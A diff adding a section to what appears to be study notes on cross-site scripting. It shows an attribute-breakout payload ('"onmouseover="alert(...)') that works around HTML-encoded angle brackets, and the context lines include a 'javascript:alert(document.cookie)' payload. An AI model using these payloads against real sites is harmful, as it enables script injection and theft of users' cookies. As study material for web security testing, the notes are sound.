@@ -82,3 +82,23 @@ javascript:alert(document.cookie)
 # test that "print()" does get called when this payload runs normally
 # now deliver the payload
 ```
+
+### angle brackets HTML-encoded [helpful but not direct sauce](https://www.secjuice.com/xss-arithmetic-operators-chaining-bypass-sanitization/)
+```
+# normal "<h1>hola</h1>" injection becomes:
+
+&lt;h1&gt;hola&lt;/h1&gt;
+
+# try avoiding angular brackets altogether; study the environment closely
+# notice that "hola" lands in a HTML attribute for an <input> tag:
+
+<input type=text placeholder='Search the blog...' name=search value="hola">
+
+# target that attribute; close it gracefully and inject an event
+
+/?search="onmouseover="alert('hola')
+
+# such that the <input> tag becomes:
+
+<input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert('hola')">
+```
